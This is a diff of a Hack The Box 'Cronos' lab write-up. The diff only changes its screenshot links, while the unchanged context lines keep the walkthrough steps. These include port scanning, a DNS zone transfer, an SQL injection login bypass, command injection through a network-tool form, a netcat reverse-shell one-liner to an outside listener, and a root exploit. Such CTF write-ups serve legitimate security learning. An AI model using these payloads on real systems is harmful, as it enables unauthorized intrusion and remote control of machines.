@@ -22,7 +22,7 @@ Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 ```
 
-![openports](https://github.com/neal1991/htb/blob/master/Cronos/openports.png)
+![AE1qlF.png](https://s2.ax1x.com/2019/03/15/AE1qlF.png)
 
 3 ports is open, detect the detailed services:
 
@@ -30,7 +30,7 @@ nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
 ```
 
-![services](https://github.com/neal1991/htb/blob/master/Cronos/services.png)
+![AE1OOJ.png](https://s2.ax1x.com/2019/03/15/AE1OOJ.png)
 
 So we can conduct the relation of ports of ports and services as following:
 
@@ -46,7 +46,7 @@ port|service
 
 As the target machine provides http service, try to access `http://10.10.10.13`
 
-![default web](https://github.com/neal1991/htb/blob/master/Cronos/80.png)
+![AE3V0A.png](https://s2.ax1x.com/2019/03/15/AE3V0A.png)
 
 Default apache web page, nothing new. So try to brute force `http://10.10.10.13/` with dirbuster. After brute force for a period time, we have not found anything new.
 
@@ -58,7 +58,7 @@ As the target machine owns DNS service. It is common to check zone transfer with
 dig axfr @10.10.10.13 cronos.htb
 ```
 
-![dns](https://github.com/neal1991/htb/blob/master/Cronos/dns.png)
+![AE3ZTI.png](https://s2.ax1x.com/2019/03/15/AE3ZTI.png)
 
 An interestring domain name `admin.cronos.htb` is found. So add an entry into `/etc/hosts`:
 
@@ -68,13 +68,13 @@ An interestring domain name `admin.cronos.htb` is found. So add an entry into `/
 
 Try to access `admin.cronos.htb` in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of `admin ' or '1' = '1`, the password can be anything.
 
-![login](https://github.com/neal1991/htb/blob/master/Cronos/login.png)
+![AE3mkt.png](https://s2.ax1x.com/2019/03/15/AE3mkt.png)
 
-![pass](https://github.com/neal1991/htb/blob/master/Cronos/pass.png)
+![AE3ntP.png](https://s2.ax1x.com/2019/03/15/AE3ntP.png)
 
 Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of `8888&whoami`:
 
-![whoami](https://github.com/neal1991/htb/blob/master/Cronos/whoami.png)
+![AE3l6g.png](https://s2.ax1x.com/2019/03/15/AE3l6g.png)
 
 The result is `www-data`. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port `1234` by nc in our kali:
 
@@ -90,7 +90,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
 
 Wait for server second, shell is return. Wonderful!
 
-![nc](https://github.com/neal1991/htb/blob/master/Cronos/nc.png)
+![AE3uff.png](https://s2.ax1x.com/2019/03/15/AE3uff.png)
 
 Try to obtain a tty terminal:
 
@@ -145,7 +145,7 @@ chmod +x exploit
 
 Just execute it by `./exploit`. Wow, now see whoami.
 
-![root](https://github.com/neal1991/htb/blob/master/Cronos/root.png)
+![AE31XQ.png](https://s2.ax1x.com/2019/03/15/AE31XQ.png)
 
 ## Conclusion
 
